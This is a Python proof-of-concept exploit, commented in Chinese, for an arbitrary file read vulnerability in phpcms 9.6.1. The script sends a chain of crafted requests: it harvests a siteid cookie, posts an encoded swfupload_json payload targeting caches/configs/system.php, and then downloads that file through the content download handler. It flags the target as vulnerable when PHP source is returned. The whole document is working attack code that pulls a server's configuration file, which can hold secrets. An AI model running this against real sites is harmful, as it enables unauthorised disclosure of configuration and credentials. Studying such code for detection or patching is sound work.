#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpcms 9.6.1任意文件读取漏洞
referer: http://bobao.360.cn/learning/detail/3805.html
author: Lucifer
description: phpcms最新版本任意文件读取，漏洞原理见来源页面。
'''
import re
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        headers = {
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        url_preffix = url + "/index.php?m=wap&c=index&a=init&siteid=1"
        siteid = ""
        att_json = ""
        try:
            req1 = requests.get(url_preffix, headers=headers, timeout=10, verify=False)
            for cookie in req1.cookies:
                siteid = cookie.value
            payload = "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&filename=test.jpg&src=%26i%3D3%26d%3D1%26t%3D9999999999%26catid%3D1%26ip%3D8.8.8.8%26m%3D3%26modelid%3D3%26s%3Dcaches%2fconfigs%2fsystem.p%26f%3Dh%25253Cp%26xxxx%3D"
            vulnurl = url + payload
            post_data = {
                "userid_flash":siteid
            }
            req2 = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            for cookie in req2.cookies:
                att_json = cookie.value
            req3 = requests.get(url+"/index.php?m=content&c=down&a=init&a_k="+att_json, headers=headers, timeout=10, verify=False)
            pattern = '<a.*?href="(.*?)".*?>.*?</a>'
            link = re.search(pattern, req3.text).group(1)
            req4 = requests.get(url+"/index.php"+link, headers=headers, verify=False)
            if r"<?php" in req4.text and r"phpsso" in req4.text:
                result[1]=  '存在'
                result[0] = vulnurl
            else:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    